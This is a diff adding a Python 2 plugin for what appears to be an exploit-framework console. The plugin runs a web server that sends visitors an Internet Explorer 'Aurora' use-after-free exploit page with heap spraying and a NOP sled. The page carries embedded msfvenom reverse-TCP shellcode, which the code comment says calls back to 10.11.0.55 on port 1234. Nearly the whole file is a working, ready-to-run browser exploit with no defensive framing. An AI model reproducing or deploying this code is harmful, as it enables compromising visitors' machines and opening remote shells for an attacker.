@@ -1,0 +1,203 @@
+#!/usr/bin/python
+
+import sys
+import socket
+import logging
+import os
+import time
+from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+intname = "rsf "
+det = sys.argv[0]
+fin = det.split('.')[-2]
+__plugin__      = "%s.plugin" % (fin)
+RescoursesDir = os.getcwd()
+dandtime = time.strftime("%H:%M:%S")
+logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)
+
+class Tee(object):
+  def __init__(self):
+    self.file = open(logfile, 'a')
+    self.stdout = sys.stdout
+
+  def __del__(self):
+    sys.stdout = self.stdout
+    self.file.close()
+
+  def write(self, data):
+    self.file.write(data)
+    self.stdout.write(data)
+
+sys.stdout = Tee()
+def dash():
+    while True:
+        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
+        terminal = raw_input(line_1).lower()
+        time.sleep(0.5)
+        if terminal == 'help':
+            print "\n"
+            print "Core Commands"
+            print "============="
+            print ""
+            print "  Command         Description"
+            print "  -------         -----------"
+            print "  help            show help menu"
+            print "  execute         run the plugin"
+            print "  exit            exit the current plugin"
+            print ""
+        elif terminal == 'execute':
+            main()
+        elif terminal == 'exit':
+            exit()
+        else:
+            print "Unknown syntax: %s" % (terminal)
+
+class RequestHandler(BaseHTTPRequestHandler):
+
+    def convert_to_utf16(self, payload):
+        enc_payload = ''
+        for i in range(0, len(payload), 2):
+            num = 0
+            for j in range(0, 2):
+                num += (ord(payload[i + j]) & 0xff) << (j * 8)
+            enc_payload += '%%u%04x' % num
+        return enc_payload
+
+    def get_payload(self):
+  # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.55 LPORT=1234 EXITFUNC=process -b "\x00" -f js_le
+	payload = "%uf5ba%u36d2%uda0f%ud9da%u2474%u5ef4%uc931%u52b1%u5631%u8312%u04c6%ua303%ud4dc%ub7fa%u9a09%u4705%ufbca%ua28c%u3bfb%ua7ea%u8bac%ue578%u6740%u1d2c%u05d2%u12f9%ua353%u1ddf%u9864%u3c1c%ue3e6%u9e70%u2bd7%udf85%u5110%u8d64%u1dc9%u21db%u6b7d%ucae0%u7dcd%u2f60%u7c85%ufe41%u269d%u0141%u5371%u19c8%u5e96%u9282%u146c%u7215%ud5bd%ubbba%u2471%ufcc2%ud7b6%uf4b1%u6ac4%uc3c2%ub0b7%ud747%u3210%u33ff%u97a0%ub066%u5cae%u9eec%u63b2%u9521%ue8cf%u79c4%uaa46%u5de2%u6802%uc48a%udfee%u16b3%ubf51%u5d11%ud47c%u3c2b%u19e9%ube06%u35e9%ucd11%u9adb%u5989%u5250%u9e14%u4997%u30e0%u7266%u1911%u26ad%u3141%u4704%uc10a%u92a9%u919d%u4d05%u415e%u3de6%u8b36%u62e9%ub426%u0b23%u4fcd%u6fa4%uff7f%uf83d%uff7d%ua42c%u1908%u4424%ub25d%ufdd1%u48c4%u0143%u35d3%u8943%ucad0%u7a0a%ud89c%u8afb%u82eb%u95aa%uaac1%u0731%u2a8e%u343f%u7d19%u8a68%ueb50%ub584%u09ca%u2355%u8934%u9082%u10bb%uac46%u029f%u2d9e%u76a4%u784e%u2072%ud228%u9a34%u89e2%u4a9e%ue272%u0c20%u2f7b%uf0d7%u86ca%u0fae%u4ee2%u6827%uef1e%ua3c8%u1f9a%ue983%ub78b%u784a%ud58e%u576c%ue3cd%u5dee%u17ae%u14ee%u5cab%uc5a8%ucdc1%ue95d%ued76%u4177"
+	return payload
+
+    def get_exploit(self):
+        exploit = '''
+        <html>
+        <head>
+            <script>
+
+            var obj, event_obj;
+
+            function spray_heap()
+            {
+                var chunk_size, payload, nopsled;
+
+                chunk_size = 0x80000;
+                payload = unescape("<PAYLOAD>");
+                nopsled = unescape("<NOP>");
+                while (nopsled.length < chunk_size)
+                    nopsled += nopsled;
+                nopsled_len = chunk_size - (payload.length + 20);
+                nopsled = nopsled.substring(0, nopsled_len);
+                heap_chunks = new Array();
+                for (var i = 0 ; i < 200 ; i++)
+                    heap_chunks[i] = nopsled + payload;
+            }
+
+            function initialize()
+            {
+                obj = new Array();
+                event_obj = null;
+                for (var i = 0; i < 200 ; i++ )
+                    obj[i] = document.createElement("COMMENT");
+            }
+
+            function ev1(evt)
+            {
+                event_obj = document.createEventObject(evt);
+                document.getElementById("sp1").innerHTML = "";
+                window.setInterval(ev2, 1);
+            }
+
+            function ev2()
+            {
+                var data, tmp;
+
+                data = "";
+                tmp = unescape("%u0a0a%u0a0a");
+                for (var i = 0 ; i < 4 ; i++)
+                    data += tmp;
+                for (i = 0 ; i < obj.length ; i++ ) {
+                    obj[i].data = data;
+                }
+                event_obj.srcElement;
+            }
+
+            function check()
+
+		{
+                document.write(navigator.userAgent);
+                return true;
+            }
+
+            if (check()) {
+                initialize();
+                spray_heap();
+            }
+            else
+                window.location = 'about:blank'
+
+            </script>
+        </head>
+        <body>
+		<h2> Hello </h2>
+            <span id="sp1">
+            <img src="aurora.gif" onload="ev1(event)">
+            </span>
+        </body>
+        </html>
+        '''
+        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
+        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
+        return exploit
+
+    def get_image(self):
+        content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
+        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
+        content += '\x01\x00\x3b'
+        return content
+
+    def log_request(self, *args, **kwargs):
+        pass
+
+    def do_GET(self):
+        try:
+            if self.path == '/':
+                print
+                print '[-] Incoming connection from %s' % self.client_address[0]
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/html')
+                self.end_headers()
+                print '[-] Sending exploit to %s ...' % self.client_address[0]
+		self.wfile.write(self.get_exploit())
+                print '[-] Exploit sent to %s' % self.client_address[0]
+            elif self.path == '/aurora.gif':
+                self.send_response(200)
+                self.send_header('Content-Type', 'image/gif')
+                self.end_headers()
+                self.wfile.write(self.get_image())
+        except:
+            print '[*] Error : an error has occured while serving the HTTP request'
+            print '[-] Exiting ...'
+            sys.exit(-1)
+
+
+def main():
+    try:
+        port = int(8080)
+        if port < 1024 or port > 65535:
+            raise ValueError
+        try:
+            serv = HTTPServer(('', port), RequestHandler)
+            ip = socket.gethostbyname(socket.gethostname())
+            print '[-] Web server is running at http://%s:%d/' % (ip, port)
+            try:
+                serv.serve_forever()
+            except:
+                print '[-] Exiting ...'
+        except socket.error:
+            print '[*] Error : a socket error has occurred'
+        sys.exit(-1)
+    except ValueError:
+        print '[*] Error : an invalid port number was given'
+        sys.exit(-1)
+
+if __name__ == '__main__':
+    dash()
